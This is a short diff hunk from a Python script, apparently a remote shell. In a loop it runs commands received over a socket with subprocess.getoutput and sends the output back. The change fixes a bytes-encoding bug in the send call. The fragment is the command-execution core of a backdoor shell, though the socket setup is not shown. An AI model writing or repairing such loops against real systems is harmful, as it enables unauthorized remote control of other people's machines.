@@ -8,5 +8,5 @@ while True:
     print('Bye!')
     break
   output = subprocess.getoutput(command)
-  s.send(output)
+  s.send(output.encode())
 s.close()
